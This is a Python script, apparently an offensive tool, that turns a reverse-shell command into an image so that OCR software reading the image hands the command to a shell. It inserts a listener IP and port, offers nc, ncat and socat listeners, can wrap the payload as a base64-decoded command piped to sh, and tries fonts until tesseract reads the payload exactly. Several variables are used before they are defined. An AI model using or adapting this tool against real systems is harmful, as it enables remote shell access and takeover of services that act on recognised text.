#!/usr/bin/env python3
import os
import argparse
import base64
import pytesseract
from PIL import Image, ImageDraw, ImageFont


class bcolors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

header = bcolors.BLUE + """
===================================================================================================
████████╗███████╗██╗  ██╗████████╗    ████████╗ ██████╗     ██╗███╗   ███╗ █████╗  ██████╗ ███████╗    
╚══██╔══╝██╔════╝╚██╗██╔╝╚══██╔══╝    ╚══██╔══╝██╔═══██╗    ██║████╗ ████║██╔══██╗██╔════╝ ██╔════╝    
   ██║   █████╗   ╚███╔╝    ██║          ██║   ██║   ██║    ██║██╔████╔██║███████║██║  ███╗█████╗      
   ██║   ██╔══╝   ██╔██╗    ██║          ██║   ██║   ██║    ██║██║╚██╔╝██║██╔══██║██║   ██║██╔══╝      
   ██║   ███████╗██╔╝ ██╗   ██║          ██║   ╚██████╔╝    ██║██║ ╚═╝ ██║██║  ██║╚██████╔╝███████╗    
   ╚═╝   ╚══════╝╚═╝  ╚═╝   ╚═╝          ╚═╝    ╚═════╝     ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝ 
                                                                                          by Trefle
====================================================================================================
""" + bcolors.ENDC

def print_with_colors(Text_str, color):
    print(color + Text_str + bcolors.ENDC)

# Parser init
parser = argparse.ArgumentParser(description=bcolors.GREEN + "A simple python script to generate image from text and get reverse shells (exploiting text recognition for example)" + bcolors.ENDC)

# first argument, required: the IP of the listener
parser.add_argument('-iP','--adress', help=bcolors.GREEN +'IP'+ bcolors.ENDC+' adress of the listener', required=True)

# listener choice
help_str = "listener (default: nc), available listeners: \n"
help_str += bcolors.GREEN + "  [-] nc\n"
help_str += "  [-] ncat\n"
help_str += "  [-] ncat_TLS\n"
help_str += "  [-] socat_TTY\n" + bcolors.ENDC
parser.add_argument('-l','--listener', help=help_str)

# name of the image file to be supplied for modification
parser.add_argument('-o','--output', help=bcolors.GREEN +'Name'+bcolors.ENDC+' of the image file to create', required=True)

# name of the image file to be supplied for modification
parser.add_argument('-b64','--base64', help='encode the payload using base 64', action="store_true")

# Port argument, I usually use 4444 so this is why this is the default
parser.add_argument('-p','--port', help=bcolors.GREEN +'Port'+bcolors.ENDC+' that you wish to use for the listener (default: 4444)')

# text file to be converted
parser.add_argument('-pf','--payload', help=bcolors.GREEN +'text file'+bcolors.ENDC+'to convert, use '+bcolors.WARNING +'^IP^'+bcolors.ENDC+' and '+bcolors.WARNING +'^PORT^'+bcolors.ENDC+' to define the IP and Port positions', required=True)

# font choice
parser.add_argument("-fo", "--font", help=bcolors.GREEN +'Font'+bcolors.ENDC+" to be used for the text in the image (default: Courier)")

# I got tired of trying again and again so I wrote a script to automate the trial and error process
parser.add_argument("-fl", "--fontlist", help=bcolors.GREEN +'Font list file'+bcolors.ENDC+", the fonts will be tried one by one until the string is correctly understood by tesseract (default: Courier)" )

def Parse_args():
    # let's get all the arguments
    args = vars(parser.parse_args())
    IP = args["adress"]

    if args["listener"]:
        listener = args["listener"]
    else:
        listener = "nc"

    OutputFileName = args["output"]
    payload_file = args["payload"]

    if args["port"]:
        Port = args["port"]
    else:
        Port = "4444"

    if args["base64"]:
        b64_bool = True
    else:
        b64_bool = False

    if args["fontlist"]:
        isfontaList = True
        font_choice = args["fontlist"]

    elif args["font"]:
        font_choice = args["font"]
    else:
        font_choice = "arial"

    return IP, Port, OutputFileName, payload_file, listener, font_choice, b64_bool, isfontaList

def Generate_image(payload, listener, IP, Port, b64_bool,font):
        if b64_bool:
            img = Image.new('RGB', (len(b64_payload) * 60, 200), color = 'black')
            str_convert = "{}".format(b64_payload,).replace('\'b\'','\'').replace('sh\'\'','sh\'')
            draw = ImageDraw.Draw(img)
            font = ImageFont.truetype("{}.ttf".format(font), 40)
            draw.text((0, 0),b64_payload.decode(),(0,0,0),font=font)
            img.save('payload.jpg')
        else:
            img = Image.new('RGB', (len(payload) * 30, 75), color = 'white')
            draw = ImageDraw.Draw(img)
            try:
                font = ImageFont.truetype("{}.ttf".format(font), 40)
            except:
                try:
                    font = ImageFont.truetype("{}.t1".format(font), 40)
                except:
                    try:
                        font = ImageFont.truetype("{}.otf".format(font), 40)
                    except:
                        return
            draw.text((0, 3),payload,(0,0,0),font=font, stroke_width=2)
            img.save('payload.jpg')

if __name__ =="__main__":
    print(header)
    IP, Port, OutputFileName, payload_file, Listener, font, b64_bool, isfontaList = Parse_args()

    print_with_colors("Current configuration\n=====================================", bcolors.GREEN)
    print(bcolors.GREEN + "[+] listener ip: {}".format(bcolors.WARNING+IP+bcolors.ENDC) +bcolors.ENDC)
    print(bcolors.GREEN + "[+] listener port: {}".format(bcolors.WARNING+Port+bcolors.ENDC) +bcolors.ENDC)
    print(bcolors.GREEN + "[+] Output file: {}".format(bcolors.WARNING+OutputFileName+bcolors.ENDC) +bcolors.ENDC)
    print(bcolors.GREEN + "[+] Payload text file: {}".format(bcolors.WARNING+payload_file+bcolors.ENDC) +bcolors.ENDC)
    print(bcolors.GREEN + "[+] Listener: {}".format(bcolors.WARNING+Listener+bcolors.ENDC) +bcolors.ENDC)
    print(bcolors.GREEN + "[+] font: {}".format(bcolors.WARNING+font+bcolors.ENDC) +bcolors.ENDC)
    print_with_colors("=====================================\n", bcolors.GREEN)

    with open(payload_file) as PLF:
        payload = PLF.read()
        payload = payload.replace("^IP^","{}".format(IP)).replace("^PORT^","{}".format(Port))
        print_with_colors("---> payload: \n{}".format(bcolors.WARNING + payload + bcolors.ENDC), bcolors.CYAN)
        if b64_bool:
            b64_payload = "base64 -d <<< ".encode() + base64.b64encode(payload.encode()) + "| sh".encode()
            print_with_colors("\n---> encoded payload: ", bcolors.CYAN)
            print(bcolors.WARNING + b64_payload.decode() + bcolors.ENDC)

    if isfontaList:
        with open(font) as FF:
            i = 0.0
            lines = FF.readlines()
            for line in lines:
                font = line.strip()
                Generate_image(payload, Listener, IP, Port, b64_bool, font)
                interpreted_payload = pytesseract.image_to_string(Image.open('payload.jpg'))
                interpreted_payload = interpreted_payload.strip().replace("\n","")
                try:
                    list = [bcolors.GREEN + interpreted_payload[i] +bcolors.ENDC if interpreted_payload[i]==payload[i] else bcolors.BLUE + interpreted_payload[i] + bcolors.ENDC for i in range(len(interpreted_payload))]
                except:
                    pass
                print("[+] calibration: {:.2f}%, {}                                                   ".strip().format(100*i/len(lines),''.join(list)), end='\r')
                if interpreted_payload == payload:
                    print("[+] calibration: {:.2f}%, {}                                                   ".strip().format(100*i/len(lines),''.join(list)))
                    print("Found a match with font: {}".format(line))
                    quit()
                i+=1

    else:
        Generate_image(payload, Listener, IP, Port, b64_bool, font)
